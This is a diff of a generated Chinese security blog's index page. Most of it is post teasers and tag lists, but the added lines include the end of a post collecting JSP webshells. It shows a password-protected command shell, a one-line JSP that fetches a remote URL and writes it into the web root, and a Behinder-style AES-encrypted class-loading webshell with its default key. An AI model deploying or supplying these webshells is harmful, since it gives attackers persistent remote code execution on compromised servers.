(Z.equals(<span class="string">&quot;P&quot;</span>)) &#123;</span><br><span class="line">            PP(z1, sb);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;Q&quot;</span>)) &#123;</span><br><span class="line">            QQ(cs, z1, z2, sb);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        sb.append(<span class="string">&quot;ERROR&quot;</span> + <span class="string">&quot;:// &quot;</span> + e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    sb.append(<span class="string">&quot;|&quot;</span> + <span class="string">&quot;&lt;-&quot;</span>);</span><br><span class="line">    out.print(sb.toString());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>密码为pass</p>
+<h2 id="远程执行下载文件"><a href="#远程执行下载文件" class="headerlink" title="远程执行下载文件"></a>远程执行下载文件</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% java.io.InputStream in = <span class="keyword">new</span> java.net.URL(request.getParameter(<span class="string">&quot;u&quot;</span>)).openStream(); <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>]; java.io.ByteArrayOutputStream baos = <span class="keyword">new</span> java.io.ByteArrayOutputStream(); <span class="keyword">int</span> a = -<span class="number">1</span>; <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123; baos.write(b, <span class="number">0</span>, a); &#125; <span class="keyword">new</span> java.io.FileOutputStream(application.getRealPath(<span class="string">&quot;/&quot;</span>)+<span class="string">&quot;/&quot;</span>+ request.getParameter(<span class="string">&quot;f&quot;</span>)).write(baos.toByteArray()); %&gt;</span><br></pre></td></tr></table></figure>
+<p>传入f为文件名称，u为URL地址</p>
+<h2 id="冰蝎马"><a href="#冰蝎马" class="headerlink" title="冰蝎马"></a>冰蝎马</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;&lt;%!<span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;U(ClassLoader c)&#123;<span class="keyword">super</span>(c);&#125;<span class="function"><span class="keyword">public</span> Class <span class="title">g</span><span class="params">(<span class="keyword">byte</span> []b)</span></span>&#123;<span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b,<span class="number">0</span>,b.length);&#125;&#125;%&gt;&lt;%<span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>))&#123;String k=<span class="string">&quot;e45e329feb5d925b&quot;</span>;<span class="comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span>session.putValue(<span class="string">&quot;u&quot;</span>,k);Cipher c=Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);c.init(<span class="number">2</span>,<span class="keyword">new</span> SecretKeySpec(k.getBytes(),<span class="string">&quot;AES&quot;</span>));<span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br></pre></td></tr></table></figure>
+<p>来源：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/84563791">https://blog.csdn.net/qq_36119192/article/details/84563791</a></p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">jsp</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">木马</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">tomcat</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/渗透测试//" class="article-tag-list-link color5">渗透测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/03/06/jsp%E9%A9%AC/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-OGNL入门" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2021/03/04/OGNL%E5%85%A5%E9%97%A8/">OGNL入门</a>
+	
+    </h1>
+  
+
+
+  
+  
+<a href="/2021/03/04/OGNL%E5%85%A5%E9%97%A8/" class="archive-article-date">
+        <time datetime="2021-03-04T11:58:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-04</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p>复现struct2 漏洞的时候看到的东西，先记一下可以学习的博客，以后再学</p>
+    
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">OGNL</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">struct2</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">jsp</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/渗透测试//" class="article-tag-list-link color5">渗透测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/03/04/OGNL%E5%85%A5%E9%97%A8/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-部分框架exp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2021/03/04/%E9%83%A8%E5%88%86%E6%A1%86%E6%9E%B6exp/">部分框架exp</a>
+	
+    </h1>
+  
+
+
+  
+  
+<a href="/2021/03/04/%E9%83%A8%E5%88%86%E6%A1%86%E6%9E%B6exp/" class="archive-article-date">
+        <time datetime="2021-03-04T02:28:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-04</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p>用<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">BUUCTF</a>和<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub">vulhub</a>的环境复现了一下，只以ls和env命令执行为例，buuctf中flag在环境变量里</p>
+    
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">exp</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/渗透测试//" class="article-tag-list-link color5">渗透测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/03/04/%E9%83%A8%E5%88%86%E6%A1%86%E6%9E%B6exp/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-学到的一点小东西" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -886,200 +1201,10 @@ var _hmt = _hmt || [];
 
 
   
-    <article id="post-简单学习javascript" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
   
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2019/07/23/%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0javascript/">简单学习javascript</a>
-	
-    </h1>
-  
-
-
-  
-  
-<a href="/2019/07/23/%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0javascript/" class="archive-article-date">
-        <time datetime="2019-07-22T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-23</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <p>学习了一下javascript，记下基础语法</p>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">javascript</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/基础语法//" class="article-tag-list-link color5">基础语法</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2019/07/23/%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0javascript/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-sql注入基础" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2019/07/18/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/">sql注入基础</a>
-	
-    </h1>
-  
-
-
-  
-  
-<a href="/2019/07/18/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/" class="archive-article-date">
-        <time datetime="2019-07-17T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-18</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <p>把我之前写的笔记搬运过来，顺便复习一下，学习的靶场都是<a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">sqli-labs</a>，技术很烂，大家将就着看就好</p>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">sql注入</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTF//" class="article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2019/07/18/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
+    <nav id="page-nav">
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+    </nav>
   
 
 
@@ -1209,7 +1334,31 @@ var _hmt = _hmt || [];
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">OGNL</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">struct2</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">jsp</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">hexo</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">木马</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">tomcat</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1217,11 +1366,11 @@ var _hmt = _hmt || [];
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">源码泄露</a>
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">python</a>
+                <a href="javascript:void(0)" class="js-tag color5">源码泄露</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1229,7 +1378,7 @@ var _hmt = _hmt || [];
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
+                <a href="javascript:void(0)" class="js-tag color4">exp</a>
               </li>
              
               <li class="article-tag-list-item">
